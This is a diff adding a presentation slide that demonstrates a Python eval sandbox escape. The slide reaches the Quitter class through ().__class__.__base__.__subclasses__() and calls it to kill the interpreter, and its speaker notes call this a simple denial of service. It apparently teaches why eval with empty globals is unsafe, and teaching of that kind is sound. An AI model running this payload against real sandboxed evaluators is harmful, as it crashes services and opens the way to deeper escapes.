@@ -1,0 +1,30 @@
+
+
+
+    <section>
+        <h3>Lets Do Something Nasty...</h3>
+<div class="fragment fade-in">
+<pre><code class="hljs" data-trim>
+syntax = """
+[
+    s for s in ().__class__.__base__.__subclasses__() 
+    if s.__name__ == 'Quitter'
+][0]('', 0)()
+"""
+eval(syntax, {}, {})
+</code></pre>
+</div>
+        
+            <aside class="notes">
+                <ul>
+<li>A simple denial of service.</li>
+<li>Use a list comprehension to find the <code>Quitter</code> class (an instance of this is the exit builtin).</li>
+<li>Create our own instance instance</li>
+<li>Call the instance to instruct the Python interpreter to exit.</li>
+</ul>
+
+            </aside>
+        
+    </section>
+
+
